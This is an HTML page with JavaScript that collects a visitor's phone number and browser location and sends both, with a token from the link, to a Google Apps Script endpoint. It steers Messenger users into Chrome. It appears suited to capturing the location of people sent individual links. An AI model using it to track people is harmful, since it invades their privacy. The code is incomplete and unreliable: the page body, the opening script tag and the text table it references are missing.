<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="theme-color" content="#4CAF50">
  <link rel="icon" href="favicon.ico">
  <title></title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      text-align: center;
      background-color: #f5f5f5;
    }

    h1 {
      font-size: 36px;
      margin-bottom: 30px;
    }

    input,
    button {
      font-size: 22px;
      padding: 15px;
      margin: 15px auto;
      width: 90%;
      max-width: 400px;
      display: block;
      border-radius: 8px;
      border: 1.5px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
    }

    #status {
      margin-top: 25px;
      color: green;
      font-weight: bold;
      font-size: 20px;
    }

    #ubicacion-alerta {
      display: none;
      background-color: #fff3cd;
      color: #856404;
      padding: 15px;
      border: 1px solid #ffeeba;
      border-radius: 10px;
      margin: 20px auto;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      text-align: left;
      line-height: 1.4;
    }

    #messenger-warning {
      background-color: #d1ecf1;
      color: #0c5460;
      padding: 20px;
      border-radius: 10px;
      margin: 20px auto;
      max-width: 400px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      font-size: 18px;
    }

    #open-in-chrome {
      margin-top: 15px;
      padding: 15px 25px;
      font-size: 20px;
      background-color: #4285f4;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      width: 90%;
      max-width: 400px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
  </style>
</head>

    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwk7KhrHTnvtPUaF3Gx174lipECuqIa3sqH2vnLPUqjBho2_Ff_ImpWsLWKZg21ARGN/exec"

    function getLang() {
      return (navigator.languages?.[0] || navigator.language || 'en')
        .toLowerCase()
        .split('-')[0];
    }

    const LANG = I18N[getLang()] || I18N.en;

    function isMessengerBrowser() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      return /FBAN|FBAV|Messenger/i.test(ua);
    }

    function openInChrome() {
      const url = window.location.href;
      const intentUrl =
        'intent://' +
        location.host +
        location.pathname +
        location.search +
        '#Intent;scheme=https;package=com.android.chrome;end';

      if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
        alert(LANG.iOSOpen);
        window.location.href = url;
        return;
      }

      window.location.href = intentUrl;

      setTimeout(() => {
        alert(LANG.openChromeFail);
      }, 2000);
    }

    function getUrlToken() {
      const params = new URLSearchParams(window.location.search);
      return params.get('token') || ''; // å¦‚æœæ²¡æœ‰ tokenï¼Œå°±ä¸ºç©º
    }

    const btn = document.getElementById('send-btn');
    const statusDiv = document.getElementById('status');

    function test() {
      sendData("123", 943205435, 454324536)
    }

    function sendData(phone, latitude, longitude) {
      const token = getUrlToken();
      const url = `${SCRIPT_URL}?phone=${encodeURIComponent(phone)}&lat=${encodeURIComponent(latitude)}&lng=${encodeURIComponent(longitude)}&token=${encodeURIComponent(token)}`;
      fetch(url, { method: 'GET' })
        .then(res => res.text())
        .then((data) => {
          if (data == "success") {
            statusDiv.innerText = LANG.success;
          } else {
            statusDiv.innerText = data;
          }
          btn.textContent = LANG.sent;
          btn.style.backgroundColor = '#007bff';
          btn.disabled = false;
        })
        .catch((e) => {
          console.log(e);
          statusDiv.innerText = LANG.errorSend;
          btn.textContent = LANG.send;
          btn.style.backgroundColor = '#4CAF50';
          btn.disabled = false;
        });
    }

    function sendLocation() {
      const phone = document.getElementById('phone').value.trim();
      const alertaDiv = document.getElementById('ubicacion-alerta');
      statusDiv.innerText = '';
      alertaDiv.style.display = 'none';

      if (!phone) {
        alert(LANG.noPhone);
        return;
      }

      if (!navigator.geolocation) {
        alert(LANG.noGeo);
        return;
      }

      btn.disabled = true;
      btn.textContent = LANG.sending;
      btn.style.backgroundColor = '#999';

      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude } = position.coords;
          sendData(phone, latitude, longitude)
        },
        error => {
          if (error.code === error.PERMISSION_DENIED) {
            alertaDiv.style.display = 'block';
          } else {
            alert(LANG.geoFail);
          }
          btn.textContent = LANG.send;
          btn.style.backgroundColor = '#4CAF50';
          btn.disabled = false;
        }
      );
    }

    window.onload = () => {
      document.documentElement.lang = getLang();

      document.title = LANG.pageTitle;
      document.getElementById('title').innerHTML = LANG.title;
      document.getElementById('phone').placeholder = LANG.phonePlaceholder;
      document.getElementById('send-btn').textContent = LANG.send;
      document.getElementById('ubicacion-alerta').innerHTML = LANG.locationAlert;
      document.getElementById('messenger-text').innerHTML = LANG.messengerText;
      document.getElementById('open-in-chrome').textContent = LANG.openChrome;
      if (isMessengerBrowser()) {
        document.getElementById('messenger-warning').style.display = 'block';
        document.getElementById('open-in-chrome').onclick = openInChrome;
        document.getElementById('phone').style.display = 'none';
        document.getElementById('send-btn').style.display = 'none';
      } else {
        document.getElementById('send-btn').onclick = sendLocation;
      }
    };
  </script>
